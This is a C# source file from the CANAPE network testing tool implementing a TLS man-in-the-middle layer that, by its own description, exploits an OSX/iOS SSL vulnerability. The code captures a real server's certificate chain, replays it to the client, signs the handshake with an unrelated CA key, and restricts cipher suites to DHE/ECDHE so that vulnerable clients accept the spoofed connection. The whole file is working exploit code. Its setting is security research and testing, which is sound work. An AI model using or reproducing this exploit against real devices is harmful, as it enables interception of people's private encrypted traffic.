//    CANAPE OSX/iOS SSL MitM Layer
//    Copyright (C) 2014 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU Affero General Public License as
//    published by the Free Software Foundation, either version 3 of the
//    License, or (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU Affero General Public License for more details.
//
//    You should have received a copy of the GNU Affero General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using CANAPE.DataAdapters;
using CANAPE.Net.Layers;
using CANAPE.Net.Tokens;
using CANAPE.Nodes;
using CANAPE.Security.Cryptography.X509Certificates;
using CANAPE.Utils;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Tls;
using Org.BouncyCastle.Security;
using System;
using System.Collections.Generic;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace CANAPE.OSXSSLMitm
{
    /// <summary>
    /// A layer class to implement a SSL network which exploits the OSX/iOS SSL vulnerability
    /// </summary>
    public class SslNetworkLayer : INetworkLayer
    {        
        SslNetworkLayerConfig _config;
        X509Certificate _remoteCert;
        List<X509Certificate> _remoteChain;

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="config">The SSL configuration</param>
        public SslNetworkLayer(SslNetworkLayerConfig config)
        {
            _config = config.Clone();
            _remoteChain = new List<X509Certificate>();
            Binding = NetworkLayerBinding.Default;
        }

        private bool ValidateRemoteClientConnection(
                Object sender,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors sslPolicyErrors
                )
        {
            bool ret = true;

            if (_config.VerifyServerCertificate)
            {
                if (sslPolicyErrors != SslPolicyErrors.None)
                {
                    ret = false;
                }
            }

            // Capture the remote chain
            _remoteChain.Clear();
            foreach (X509ChainElement e in chain.ChainElements)
            {
                _remoteChain.Add(e.Certificate);
            }
            
            return ret;
        }

        private bool ValidateRemoteServerConnection(
            Object sender,
            X509Certificate certificate,
            X509Chain chain,
            SslPolicyErrors sslPolicyErrors
        )
        {
            bool ret = true;

            if (_config.RequireClientCertificate && _config.VerifyClientCertificate)
            {
                if (sslPolicyErrors != SslPolicyErrors.None)
                {
                    ret = false;
                }
            }

            return ret;
        }

        private static int nameCounter = 0;

        private static void PopulateSslMeta(PropertyBag properties, SslStream stm)
        {                       
            properties.AddValue("SslProtocol", stm.SslProtocol);
            properties.AddValue("IsSigned", stm.IsSigned);
            properties.AddValue("IsMutallyAuthenticated", stm.IsMutuallyAuthenticated);
            properties.AddValue("IsEncrypted", stm.IsEncrypted);
            properties.AddValue("CipherAlgorithm", stm.CipherAlgorithm);
            properties.AddValue("CipherStrength", stm.CipherStrength);
            properties.AddValue("HashAlgorithm", stm.HashAlgorithm);
            properties.AddValue("HashStrength", stm.HashStrength);
            properties.AddValue("KeyExchangeAlgorithm", stm.KeyExchangeAlgorithm);
            properties.AddValue("KeyExchangeStrength", stm.KeyExchangeStrength);

            if(stm.LocalCertificate != null)
            {
                properties.AddValue("LocalCertificate", stm.LocalCertificate);
            }

            if (stm.RemoteCertificate != null)
            {
                properties.AddValue("RemoteCertificate", stm.RemoteCertificate);
            }
        }

        private IDataAdapter ConnectClient(IDataAdapter adapter, Logger logger, PropertyBag properties, string serverName)
        {
            SslStream sslStream = new SslStream(new DataAdapterToStream(adapter), false, ValidateRemoteClientConnection);

            if (serverName == null)
            {                
                // Just generate something
                serverName = Interlocked.Increment(ref nameCounter).ToString();
            }

            X509Certificate2Collection clientCerts = new X509Certificate2Collection();
            bool setReadTimeout = false;
            int oldTimeout = -1;

            foreach(X509CertificateContainer clientCert in _config.ClientCertificates)
            {
                clientCerts.Add(clientCert.Certificate);
            }

            try
            {
                oldTimeout = sslStream.ReadTimeout;
                sslStream.ReadTimeout = _config.Timeout;
                setReadTimeout = true;
            }
            catch (InvalidOperationException)
            {
            }

            sslStream.AuthenticateAsClient(serverName, clientCerts, SslProtocols.Tls, false);

            if (setReadTimeout)
            {
                sslStream.ReadTimeout = oldTimeout;
            }

            _remoteCert = sslStream.RemoteCertificate;

            PopulateSslMeta(properties.AddBag("SslClient"), sslStream);

            return new StreamDataAdapter(sslStream, adapter.Description);
        }
 
        private class CustomTlsServer : DefaultTlsServer
        {
            private Certificate _cert;
            private AsymmetricKeyParameter _key;
            private Logger _logger;

            public CustomTlsServer(X509Certificate[] certs, AsymmetricAlgorithm key, Logger logger)
            {
                X509CertificateStructure[] newcerts = new X509CertificateStructure[certs.Length];

                for (int i = 0; i < certs.Length; ++i)
                {
                    Org.BouncyCastle.X509.X509Certificate c = DotNetUtilities.FromX509Certificate(certs[i]);

                    newcerts[i] = c.CertificateStructure;
                }

                _cert = new Certificate(newcerts);
                _key = DotNetUtilities.GetRsaKeyPair((RSA)key).Private;
                _logger = logger;
            }

            protected override ProtocolVersion MinimumVersion
            {
                get
                {
                    return ProtocolVersion.SSLv3;
                }
            }

            protected override ProtocolVersion MaximumVersion
            {
                get
                {
                    return ProtocolVersion.TLSv12;
                }
            }

            protected override CipherSuite[] CipherSuites
            {
                get
                {
                    return new CipherSuite[]{
                        CipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
                        CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, 
                        CipherSuite.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,
                        CipherSuite.TLS_ECDHE_RSA_WITH_RC4_128_SHA,
                        CipherSuite.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
                        CipherSuite.TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA,
                        
                    };
                }
            }

            private TlsSignerCredentials TlsSignerCredentials(TlsContext context) {
                return new DefaultTlsSignerCredentials(context, _cert, _key);                
            }

            protected override TlsSignerCredentials GetRSASignerCredentials()
            {
                return TlsSignerCredentials(context);
            } 
        }

        private IDataAdapter ConnectServerBC(IDataAdapter adapter, Logger logger, PropertyBag properties)
        {
            X509Certificate cert = null;

            // If server certificate not specified try and auto generate one
            if (!_config.SpecifyServerCert)
            {
                if (_remoteCert != null)
                {
                    cert = _remoteCert;
                }
                else
                {
                    cert = CertManager.GetCertificate("CN=localhost");
                }
            }
            else if (_config.ServerCertificate != null)
            {
                cert = _config.ServerCertificate.Certificate;
            }
            else
            {
                // Ideally shouldn't get here, but not necessarily consistent :)
                cert = CertManager.GetCertificate("CN=localhost");
            }

            DataAdapterToStream stm = new DataAdapterToStream(adapter);

            TlsServerProtocol server = new TlsServerProtocol(stm, stm, new SecureRandom());
           

            bool setReadTimeout = false;
            int oldTimeout = -1;

            try
            {
                oldTimeout = stm.ReadTimeout;
                stm.ReadTimeout = _config.Timeout;
                setReadTimeout = true;
            }
            catch (InvalidOperationException)
            {
            }

            X509Certificate[] certs;

            // If we have a remote chain then duplicate all certificates
            if (_remoteChain.Count > 0)
            {
                certs = _remoteChain.ToArray();
            }
            else
            {
                certs = new X509Certificate[] { cert };
            }

            // Accept with our CA key, doesn't really matter what it is but no point generating each time
            server.Accept(new CustomTlsServer(certs, CertManager.GetRootCert().PrivateKey, logger));

            if (setReadTimeout)
            {
                stm.ReadTimeout = oldTimeout;
            }

            // Return re-adapted layer
            return new StreamDataAdapter(server.Stream, adapter.Description);
        }


        /// <summary>
        /// Negotiate the layer
        /// </summary>
        /// <param name="server">The server data adapter</param>
        /// <param name="client">The client data adapter</param>
        /// <param name="token">The associated proxy token</param>
        /// <param name="logger">The current service's logger</param>
        /// <param name="meta">The current service's meta dictionary</param>
        /// <param name="globalMeta">The current global meta dictionary</param>
        /// <param name="properties">Additional properties</param>
        /// <param name="defaultBinding">The default binding</param>
        public void Negotiate(ref IDataAdapter server, ref IDataAdapter client, ProxyToken token, Logger logger, 
            MetaDictionary meta, MetaDictionary globalMeta, PropertyBag properties, NetworkLayerBinding defaultBinding)
        {
            if (_config.Enabled)
            {
                if (defaultBinding == NetworkLayerBinding.Default)
                {
                    defaultBinding = NetworkLayerBinding.ClientAndServer;
                }

                if (Binding != NetworkLayerBinding.Default)
                {
                    defaultBinding = Binding;
                }

                if ((defaultBinding & NetworkLayerBinding.Client) == NetworkLayerBinding.Client)
                {
                    if (_config.ClientProtocol != SslProtocols.None)
                    {
                        IpProxyToken iptoken = token as IpProxyToken;
                        string serverName = null;

                        if (iptoken != null)
                        {
                            if (!String.IsNullOrWhiteSpace(iptoken.Hostname))
                            {
                                serverName = iptoken.Hostname;
                            }
                            else
                            {
                                serverName = iptoken.Address.ToString();
                            }
                        }
                        client = ConnectClient(client, logger, properties, serverName);
                    }
                }

                if ((defaultBinding & NetworkLayerBinding.Server) == NetworkLayerBinding.Server)
                {
                    if (_config.ServerProtocol != SslProtocols.None)
                    {
                        server = ConnectServerBC(server, logger, properties);
                    }
                }
            }
        }

        /// <summary>
        /// Get or set the binding mode used
        /// </summary>
        public NetworkLayerBinding Binding
        {
            get; set; 
        }
    }
}
